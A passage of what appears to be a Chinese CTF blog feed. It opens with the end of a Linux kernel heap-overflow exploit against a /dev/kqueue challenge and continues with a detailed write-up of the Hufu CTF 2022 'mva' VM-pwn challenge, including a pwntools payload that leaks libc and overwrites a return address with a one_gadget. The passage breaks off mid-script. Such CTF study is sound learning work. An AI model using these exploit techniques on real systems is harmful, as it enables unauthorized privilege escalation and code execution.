class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap_overflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">size_t</span> sh = (<span class="type">size_t</span>)getShell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shellcode</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov r11, [rsp + 0x8];&quot;</span></span><br><span class="line">            <span class="string">&quot;sub r11, 0x201179;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;add r12, 0x8C580;&quot;</span>     <span class="comment">// prepare_kernel_cred</span></span><br><span class="line">            <span class="string">&quot;add r11, 0x8C140;&quot;</span>     <span class="comment">// commit_creds</span></span><br><span class="line">            <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">            <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, rax;&quot;</span></span><br><span class="line">            <span class="string">&quot;call r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_rflags;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, sh;&quot;</span></span><br><span class="line">            <span class="string">&quot;push r11;&quot;</span></span><br><span class="line">            <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="type">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        error_log(<span class="string">&quot;Cannot open /dev/kqueue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x20</span>; i++)</span><br><span class="line">        data[i] = (<span class="type">size_t</span>)shellcode;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> create_req = &#123;</span><br><span class="line">            .max_entries = <span class="number">0xFFFFFFFF</span>,</span><br><span class="line">            .data_size = <span class="number">0x20</span> * <span class="number">8</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CREATE_KQUEUE, &amp;create_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue created.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> edit_req = &#123;</span><br><span class="line">            .queue_idx = <span class="number">0</span>,</span><br><span class="line">            .entry_idx = <span class="number">0</span>,</span><br><span class="line">            .data = (<span class="type">char</span>*)data,</span><br><span class="line">    &#125;;</span><br><span class="line">    info_log(<span class="string">&quot;ready to edit queue, content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)data, <span class="number">0x100</span>);</span><br><span class="line">    ioctl(fd, EDIT_KQUEUE, &amp;edit_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue edited.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    info_log(<span class="string">&quot;0x200 stat file opened.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> save_req = &#123;</span><br><span class="line">            .queue_idx = <span class="number">0</span>,</span><br><span class="line">            .max_entries = <span class="number">0</span>,</span><br><span class="line">            .data_size = <span class="number">0x40</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, SAVE, &amp;save_req);</span><br><span class="line">    info_log(<span class="string">&quot;queue saved.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;ready to read stat file...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        read(seq_fd[i], data, <span class="number">1</span>);</span><br><span class="line">    info_log(<span class="string">&quot;stat file reading completed.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提权成功。（虽然不是以#开头但可以读取flag文件）<br><img src="https://img-blog.csdnimg.cn/88c546691ef24b55b94341a41477c9c5.png"><br>在内核态堆溢出题中，我们需要充分利用“大小相等的内存块可能会被分配到相邻位置”这一特性溢出覆盖。内核中的内存块空间没有用户态那样的块首结构，需要注意。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>虎符CTF-2022 mva 题解</title>
      <link href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>这是一道vm题。前几天师傅让我看看这道题，发现是一种没有做过的类型。查询相关资料之后有了一定的了解。由于是第一次做这种题，就将wp写的尽可能详细一些，作为笔记备查。</p><p>源文件：<a href="https://github.com/Hornos3/pwnfile">my_github</a></p><p>vm-pwn是一种虚拟机pwn，我的理解是，我们自己用C语言写一个虚拟机。在这个虚拟机里面可以进行各种操作，如加减乘除、堆栈操作等。这里各种操作的操作码可以是我们自己定义的，比如我们定义01开头的指令为加，02开头为减，等等。我们不管当前的主流架构是怎么实现的，这个程序本身相当于是”发明“了一种小型的轻量级的汇编语言。我们需要找到这种语言的漏洞以跳出虚拟机，进而getshell或getflag。</p><p>大致了解了这种题目的背景之后，我们就可以进去看题了。</p><p><img src="https://img-blog.csdnimg.cn/00463dbffccb42a095c58f9eec334add.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>指令首先是写在了bss段的一个地方，在main函数中有一个死循环，里面的sub_11E9函数应该就是读取指令的函数了。改名为read_cmd。</p><p>这里反汇编看着不太清楚，还是要深入到汇编去查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001213                 lea     rdx, code</span><br><span class="line">.text:000000000000121A                 add     rax, rdx</span><br><span class="line">.text:000000000000121D                 mov     eax, [rax]</span><br><span class="line">.text:000000000000121F                 mov     [rbp+var_C], eax</span><br><span class="line">.text:0000000000001222                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001225                 shr     eax, 18h</span><br><span class="line">.text:0000000000001228                 mov     edx, eax</span><br><span class="line">.text:000000000000122A                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000122D                 shr     eax, 8</span><br><span class="line">.text:0000000000001230                 and     eax, 0FF00h</span><br><span class="line">.text:0000000000001235                 or      edx, eax</span><br><span class="line">.text:0000000000001237                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000123A                 shl     eax, 8</span><br><span class="line">.text:000000000000123D                 and     eax, 0FF0000h</span><br><span class="line">.text:0000000000001242                 or      edx, eax</span><br><span class="line">.text:0000000000001244                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001247                 shl     eax, 18h</span><br><span class="line">.text:000000000000124A                 or      eax, edx</span><br></pre></td></tr></table></figure><p>上面这一段汇编是read_cmd里面的，主要功能就是从输入的指令中读取4字节后将这4字节高位变低位，低位变高位（从小端序到大端序的转换）。在read_cmd返回后，eax中存放的就是读取到的指令。读取指令后返回到main函数中，一开始看到main函数下面有很多没有解析的部分，将其手动转为汇编代码，发现有很多跳转指令，那么基本可以判断出，下面就是解析并执行指令的部分了。跳转指令应该是在判断指令的类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000135E                 mov     eax, 0</span><br><span class="line">.text:0000000000001363                 call    read_cmd</span><br><span class="line">.text:0000000000001368                 mov     [rbp+var_23C], eax</span><br><span class="line">.text:000000000000136E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001374                 shr     eax, 18h</span><br><span class="line">.text:0000000000001377                 mov     [rbp+var_240], ax</span><br><span class="line">.text:000000000000137E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001384                 sar     eax, 10h</span><br><span class="line">.text:0000000000001387                 mov     [rbp+var_249], al</span><br><span class="line">.text:000000000000138D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001393                 sar     ax, 8</span><br><span class="line">.text:0000000000001397                 mov     [rbp+var_248], al</span><br><span class="line">.text:000000000000139D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013A3                 mov     [rbp+var_247], al</span><br><span class="line">.text:00000000000013A9                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013AF                 mov     [rbp+var_23E], ax</span><br></pre></td></tr></table></figure><p>在调用read_cmd函数之后，main函数将指令的不同位保存到栈中不同的位置，但这些位置基本上相邻。</p><p>下图为栈中保存的指令值情况（假设读取的指令为0x76543210）</p><table align=center><tr align=center>    <td> addr </td> <td> +0 </td> <td> +1 </td> <td> +2 </td> <td> +3 </td>    <td> +4 </td> <td> +5 </td> <td> +6 </td> <td> +7 </td></tr><tr align=center>    <td> rbp-0x250 </td> <td> - </td> <td> - </td> <td> - </td> <td> - </td>    <td> - </td> <td> - </td> <td> - </td> <td> 32 </td></tr><tr align=center>    <td> rbp-0x248 </td> <td> 54 </td> <td> 76 </td> <td> - </td> <td> - </td>    <td> - </td> <td> - </td> <td> - </td> <td> - </td></tr><tr align=center>    <td> rbp-0x240 </td> <td> 10 </td> <td> - </td> <td> 76 </td> <td> 54 </td>    <td> 76 </td> <td> 54 </td> <td> 32 </td> <td> 10 </td></tr></table><p>之后判断原输入的最低位是否大于0xF，如果大于则跳过该指令。这说明这个虚拟机中的指令码只可能有0x0~0xF最多16种。我们修改一下输入，然后接着跟着执行流一步一步走。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000000206C dword_206C      dd 0FFFFF38Bh           ; DATA XREF: main+134↑o</span><br><span class="line">.rodata:000000000000206C                                         ; main+140↑o</span><br><span class="line">.rodata:0000000000002070                 dd 0FFFFF399h</span><br><span class="line">.rodata:0000000000002074                 dd 0FFFFF3D2h</span><br><span class="line">.rodata:0000000000002078                 dd 0FFFFF460h</span><br><span class="line">.rodata:000000000000207C                 dd 0FFFFF4F0h</span><br><span class="line">.rodata:0000000000002080                 dd 0FFFFF57Eh</span><br><span class="line">.rodata:0000000000002084                 dd 0FFFFF60Ch</span><br><span class="line">.rodata:0000000000002088                 dd 0FFFFF686h</span><br><span class="line">.rodata:000000000000208C                 dd 0FFFFF714h</span><br><span class="line">.rodata:0000000000002090                 dd 0FFFFF735h</span><br><span class="line">.rodata:0000000000002094                 dd 0FFFFF7A7h</span><br><span class="line">.rodata:0000000000002098                 dd 0FFFFF80Ah</span><br><span class="line">.rodata:000000000000209C                 dd 0FFFFF839h</span><br><span class="line">.rodata:00000000000020A0                 dd 0FFFFF8B4h</span><br><span class="line">.rodata:00000000000020A4                 dd 0FFFFF940h</span><br><span class="line">.rodata:00000000000020A8                 dd 0FFFFF994h</span><br></pre></td></tr></table></figure><p>接下来，程序提到了rodata中的这个地方，这里发现这个未知数据的长度为64字节，正好是16*4，每一个4字节对应一条指令，但具体含义尚不清楚。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000013D6                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:00000000000013DE                 lea     rax, dword_206C</span><br><span class="line">.text:00000000000013E5                 mov     eax, [rdx+rax]</span><br><span class="line">.text:00000000000013E8                 cdqe</span><br><span class="line">.text:00000000000013EA                 lea     rdx, dword_206C</span><br><span class="line">.text:00000000000013F1                 add     rax, rdx</span><br><span class="line">.text:00000000000013F4                 db      3Eh</span><br><span class="line">.text:00000000000013F4                 jmp     rax</span><br></pre></td></tr></table></figure><p>往下看不远处，我们就知道这个64字节数据是用来干嘛的了。它起始就是一个地址的偏移量，将对应指令的偏移量加上rodata的地址值，得到的就是指令对应的执行部分的地址。将其重命名为exec_offset。</p><p>……</p><p>经过亿段时间的分析之后，我大概搞清楚了其中一些指令的含义。</p><p>在这个虚拟机中一共有6个word类型的寄存器，这6个寄存器通过偏移获取。在这16种指令中有加减乘除、与或异或等算数指令，这些指令需要3个操作数。格式为：（下面所有格式均为高地址到低地址，在写入时需要调换一下顺序）</p><blockquote><p>指令码: 2, 功能: 加法, 格式: op1 op2 op3 0x2——reg(op3) &#x3D; reg(op1) + reg(op2)<br>指令码: 3, 功能: 减法, 格式: op1 op2 op3 0x3——reg(op3) &#x3D; reg(op2) - reg(op1)<br>指令码: 4, 功能: 按位与, 格式: op1 op2 op3 0x4——reg(op3) &#x3D; reg(op2) &amp; reg(op1)<br>指令码: 5, 功能: 按位或, 格式: op1 op2 op3 0x5——reg(op3)&#x3D; reg(op2) | reg(op1)<br>指令码: 6, 功能: 右移, 格式: op1 op2 op3 0x6——reg(op3) &#x3D; reg(op3) &gt;&gt; reg(op2)<br>指令码: 7, 功能: 按位异或, 格式: op1 op2 op3 0x7——reg(op3) &#x3D; reg(op1) ^ reg(op2)<br>指令码: 13, 功能: 乘法, 格式: op1 op2 op3 0xD——reg(op3) &#x3D; reg(op1) * reg(op2) 【注意这里没有检查op2的范围，是一个漏洞】</p></blockquote><p>除此之外，还有一些其他类型的指令，这里也列举一下。</p><blockquote><p>指令码: 0, 功能: 退出, 格式: op1 op2 op3 0x0——exit()<br>指令码: 1, 功能: 赋值, 格式: op1 op2 op3 0x1——reg(op3) &#x3D; op1 + op2 &gt;&gt; 8 (op1 &#x3D; LOBYTE(op3), op2 &#x3D; HIBYTE(op3))<br>指令码: 9, 功能: 入栈, 格式: op1 op2 op3 0x9——若op3 &#x3D;&#x3D; 0则push (reg(0))，若op3 !&#x3D; 0则push (op1 + op2 &gt;&gt; 8) 【注意这里虽然有对栈是否满的检查，但是没有对op3大小的检查，可以push虚拟机空间之外的东西，是一个漏洞】<br>指令码: 10, 功能: 出栈, 格式: op1 op2 op3 0xA——reg(op3) &#x3D; pop()【这里有对op3大小和栈是否为空的检查】<br>指令码: 12, 功能: 比较两个寄存器的值是否相等。因为返回相等的控制位没有被其他指令所引用，因此这里不做分析。<br>指令码: 14, 功能: 寄存器赋值, 格式: op1 op2 op3 0xE——reg(op2) &#x3D; reg(op3)【注意这里没有检查op2是否为负数，是一个漏洞】<br>指令码: 15, 功能: 输出栈顶的值（这里指的是没有被占用的地方，也就是栈实际占用空间还往上一个字的值，这个字现在实际上并没有进入堆栈）</p></blockquote><p>还有8和11的指令码没有分析，不过从官方wp上看这两个应该是无关紧要的，就暂且不管了。</p><p>然后我们需要整理一下思路，想想如何才能利用上面的漏洞getshell。</p><p>要想getshell，首先要拿到libc加载地址，通过这个加载地址得到one_gadget的地址，然后需要将one_gadget地址写入返回地址中。整个过程看似简单，但首先第一个问题：如何拿到libc加载地址？</p><p>注意到赋值操作中目的操作数是没有检查负数的情况的，经过IDA调试发现栈指针在寄存器的低地址处，我们可以让目的操作数为负进而指向栈指针，这样我们就可以用寄存器中的值去覆盖栈指针的值。栈指针是一个8字节结构，对应赋值的偏移应为0xF6、0xF7、0xF8、0xF9，我们将0xF6偏移位置覆盖为0x8000即可让栈指针变为负数。在输出值（指令码0xF）时，这个最高位的0x8000会溢出，从而我们可以读取寄存器后面任何一个位置的地址。经过试验发现，栈指针为0x10C时对应main返回地址最低字，即__libc_start_main+243。我们读取0x10C、0x10D、0x10E三个字的值就可以完全掌握libc的加载地址了。注意这里读取不用0xF指令，因为它只有输出功能，等脚本读到输出之后你的小程序早就执行完了。因此这里使用pop指令，它只会检查栈指针是否为0，因此可以绕过。</p><p><img src="https://img-blog.csdnimg.cn/87837b63a1d84e62ba4ae3a8abf63b67.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>在pop之后，我们获得了libc的加载地址，这里需要进行一些计算来获得one_gadget的地址。然后我们将其push到返回地址处就可以了。这里需要注意的是，由于每一个寄存器只有2字节长度，因此返回地址需要用3个寄存器存储，在计算的时候会忽略向高位的借位，因此可能在计算时出错，但这是一个小概率事件，大约有1&#x2F;4的概率会失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00005607BDE667A1 case_9:                                 ; *** code: 9</span><br><span class="line">.text:00005607BDE667A1 mov     rax, [rbp+var_230]              ;     function: if var_230(?) &lt;= 100h then exit</span><br><span class="line">.text:00005607BDE667A1                                         ;               else then ???</span><br><span class="line">.text:00005607BDE667A8 cmp     rax, 100h</span><br><span class="line">.text:00005607BDE667AE jle     short loc_5607BDE667BA</span><br><span class="line">.text:00005607BDE667B0 mov     edi, 0                          ; status</span><br><span class="line">.text:00005607BDE667B5 call    _exit</span><br></pre></td></tr></table></figure><p>请注意上面的代码片段，这是检查栈指针是否大于100。但是跳转是jle，这表示它是有符号的比较。那也就是说如果栈指针是一个负数，如果看做无符号数的话是一个很大的数，但也能通过检查，这就为我们写入返回地址创造了条件。</p><p>因此，大致的步骤就是：</p><p>Step 1: 修改栈指针到返回地址处<br>Step 2: 读取返回地址<br>Step 3: 计算one_gadget地址<br>Step 4: 写入返回地址<br>Step 5: getshell</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line">Libc_libc_start_main = <span class="number">0x23FC0</span></span><br><span class="line">Libc_one_gadget = <span class="number">0xE3B31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_command</span>(<span class="params">code, op1, op2, op3</span>):</span><br><span class="line"><span class="keyword">return</span> p8(code) + p8(op1) + p8(op2) + p8(op3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movl</span>(<span class="params">reg, value</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">1</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">dest, add1, add2</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">2</span>, dest, add1, add2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">dest, subee, suber</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">3</span>, dest, subee, suber)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">band</span>(<span class="params">dest, and1, and2</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">4</span>, dest, and1, and2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bor</span>(<span class="params">dest, or1, or2</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">5</span>, dest, or1, or2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sar</span>(<span class="params">dest, off</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">6</span>, dest, off, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">dest, xor1, xor2</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">7</span>, dest, xor1, xor2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg, value</span>):</span><br><span class="line"><span class="keyword">if</span> reg == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">9</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">9</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">10</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imul</span>(<span class="params">dest, imul1, imul2</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">13</span>, dest, imul1, imul2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">src, dest</span>):</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">14</span>, src, dest, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_top</span>():</span><br><span class="line"><span class="keyword">return</span> get_command(<span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: get __libc_start_main + 243</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x8000</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF9</span>)<span class="comment"># bypass the check by making it nagative</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x010F</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF6</span>)</span><br><span class="line">payload += pop(<span class="number">0</span>)<span class="comment"># HIGH WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">1</span>)<span class="comment"># MIDDLE WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">2</span>)<span class="comment"># LOW WORD of __libc_start_main</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">243</span>)</span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)<span class="comment"># this step may fail due to the ignorance of borrowed bit, but in 1/16 to fail</span></span><br><span class="line"><span class="comment"># __libc_start_main got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3FC0</span>)<span class="comment"># this step may also fail due to same reason, 1/4 to fail until now</span></span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x2</span>)</span><br><span class="line">payload += sub(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># libc load address got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3B31</span>)</span><br><span class="line">payload += add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0xE</span>)</span><br><span class="line">payload += add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># one_gadget address got</span></span><br><span class="line"></span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">payload += mov(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># write one_gadget address to return_addr</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for c in payload:</span></span><br><span class="line"><span class="comment"># print(&#x27;%02x&#x27; % c, end=&#x27; &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+] Welcome to MVA, input your code now 